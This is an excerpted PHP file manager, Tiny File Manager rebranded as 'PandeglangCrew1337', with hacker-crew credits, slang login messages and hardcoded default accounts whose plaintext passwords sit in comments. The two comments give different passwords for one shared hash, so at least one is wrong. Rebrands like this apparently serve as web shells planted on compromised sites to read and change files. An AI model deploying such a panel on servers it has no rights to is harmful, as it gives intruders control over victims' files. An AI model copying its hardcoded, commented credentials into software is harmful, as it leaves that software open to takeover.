...
define('APP_TITLE', 'PandeglangBLackaHAT');

$use_auth = true;

$auth_users = array(
    'adminer' => '$2a$10$bbFgNeT1nGNLZYPfxKN07ORVCHCT.9u.8FLvMdO76.ClV6AP85qWC', //admin@123
    'user' => '$2a$10$bbFgNeT1nGNLZYPfxKN07ORVCHCT.9u.8FLvMdO76.ClV6AP85qWC' //12345
);
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                ...
                fm_set_msg(lng('Login Sukses Bree!'));
                fm_redirect(FM_ROOT_URL . $_SERVER['REQUEST_URI']);
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('username and password invalid cuyh!'), 'error');
                fm_redirect(FM_ROOT_URL . $_SERVER['REQUEST_URI']);
            }
        } else {
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="{SLoerD}PandeglangCrew1337">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">PandeglangCrew1337</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
...
if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
    ...
    if (isset($_POST['type']) && $_POST['type'] == "save") {
        ...
        if ($file == '' || !is_file($path . '/' . $file)) {
            fm_set_msg(lng('File Mana File??'), 'error');
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> PandeglangCrew1337 <?php echo VERSION; ?></a></h3></p>
                        <p>Author: Prasath Mani</p>
                        <p>Recoder: Yolacctfast</p>
                        <p>Mail Us: <a href="mailto: cybercringe95@gmail.com">cybercringe95@gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">PandeglangCrew1337 <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">PandeglangCrew1337 <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'PandeglangCrew1337<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with PandeglangCrew1337">
    <meta name="Recoder" content="Yolacctfast">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'PandeglangCrew1337';      $tr['en']['AppTitle']           = 'File Manager';
    ...
    $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['Login Sukses Bree!'] = 'Login Sukses Bree!';
    ...
    $tr['en']['File Mana File??']     = 'File Mana File??';     $tr['en']['Error while deleting items'] = 'Error while deleting items';
    $tr['en']['Moved from']         = 'Moved from';         $tr['en']['Generate new password hash'] = 'Generate new password hash';
    $tr['en']['username and password invalid cuyh!'] = 'username and password invalid cuyh!';
